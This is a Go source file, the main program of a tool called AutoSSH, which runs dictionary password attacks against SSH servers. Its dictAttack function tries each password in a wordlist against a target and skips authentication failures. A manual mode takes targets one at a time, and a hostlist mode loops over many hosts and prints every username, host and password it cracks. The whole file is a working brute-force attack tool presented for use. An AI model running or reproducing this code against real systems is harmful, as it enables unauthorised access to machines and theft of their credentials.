package main

import (
	"errors"
	"fmt"
	"log"
	"math"
	"os"

	"github.com/cfschilham/autossh/internal/loadcfg"
	"github.com/cfschilham/autossh/internal/sshconn"
)

var authErrs = []string{
	"ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain",
	"ssh: handshake failed: ssh: unable to authenticate, attempted methods [password none], no supported methods remain",
	"ssh: handshake failed: ssh: unable to authenticate, attempted methods [none], no supported methods remain",
}

// inStrSlc returns true when str is the same as an entry of slc
func inStrSlc(str string, slc []string) bool {
	for _, entry := range slc {
		if entry == str {
			return true
		}
	}
	return false
}

// dictAttack attempts to establish an SSH connection with the given parameters and returns a
// non-empty password string and a nil error in case of a successful connection. A non-nil error means an unsuccessful
// authentication.
func dictAttack(h loadcfg.Host, dict *loadcfg.Dict, port string, verbose bool) (string, error) {
	for _, pwd := range dict.Pwds() {
		if verbose {
			fmt.Printf("Trying to connect with password '%s'\n", pwd)
		}
		if err := sshconn.SSHConn(h.IP(), h.Username(), port, pwd); err != nil {
			// If the non-nil error is not an auth error an error is returned because this means it does not have anything to do with the
			// password being wrong. If it is an auth error, however, we simply move on to the next pwd in dict.Pwds()
			if !inStrSlc(err.Error(), authErrs) {
				return "", err
			}
		} else {
			return pwd, nil
		}
	}
	// If this point is reached all passwords in the dictionary have been tried and all returned an auth error.
	return "", errors.New("main: failed to authenticate with dictionary")
}

func main() {
	fmt.Println("AutoSSH v1.0.1 - https://github.com/cfschilham/autossh")

	fmt.Println("Loading cfg/config.yml...")
	config, err := loadcfg.LoadConfig()
	if err != nil {
		log.Fatalln(err.Error())
	}

	fmt.Printf("Loading %s...\n", config.DictPath())
	dict, err := loadcfg.LoadDict(config.DictPath())
	if err != nil {
		log.Fatalln(err.Error())
	}

	switch config.Mode() {
	case "manual":
		if config.UsrIsHost() {
			fmt.Println("You currently have 'user_is_host' enabled in cfg/config.yml. This means an input of, for example, 'pcname' will be inferred as 'pcname@pcname.local'")
		} else {
			fmt.Println("Example input: 'john@johns-pc.local', 'peter@192.168.1.2'")
		}

		for {
			var input string
			fmt.Print("Enter host (type 'exit' to exit): ")
			fmt.Scanln(&input)

			if input == "exit" {
				os.Exit(0)
			}

			// Use user input to create a new Host struct
			h, err := loadcfg.StrToHost(input, config.UsrIsHost())
			if err != nil {
				log.Println(err.Error())
				continue
			}

			fmt.Printf("Attempting to connect to '%s@%s'...\n", h.Username(), h.IP())
			pwd, err := dictAttack(h, dict, config.Port(), config.Verbose())
			if err != nil {
				log.Println(err.Error())
				continue
			}
			fmt.Printf("Password of '%s' found: %s\n", h.Username()+"@"+h.IP(), pwd)
		}

	case "hostlist":
		fmt.Printf("Loading %s...\n", config.HostlistPath())
		hl, err := loadcfg.LoadHostlist(config.HostlistPath(), config.UsrIsHost())
		if err != nil {
			log.Fatalln(err.Error())
		}

		// Loop through host list and append found username, hostname and password-combinations to a map
		var hostPwdCombos = map[string]string{}
		for i, h := range hl.Hosts() {
			fmt.Printf("%d%% done\n", int(math.Round(float64(i)/float64(len(hl.Hosts()))*100)))
			fmt.Printf("Attempting to connect to '%s@%s'...\n", h.Username(), h.IP())
			pwd, err := dictAttack(h, dict, config.Port(), config.Verbose())
			if err != nil {
				log.Println(err.Error())
				continue
			}
			fmt.Printf("Password of '%s' found: %s\n", h.Username()+"@"+h.IP(), pwd)
			hostPwdCombos[h.IP()] = pwd
		}

		// Print all found combinations
		if len(hostPwdCombos) > 0 {
			fmt.Println("The following combinations were found: ")
			for host, pwd := range hostPwdCombos {
				fmt.Printf("Host: '%s' | Password: '%s'\n", host, pwd)
			}
		} else {
			fmt.Println("No combinations were found")
		}

		fmt.Println("Press enter to exit...")
		fmt.Scanln()

	default:
		log.Fatalf("cfg/config.yml: '%s' is not a valid mode", config.Mode())
	}
}
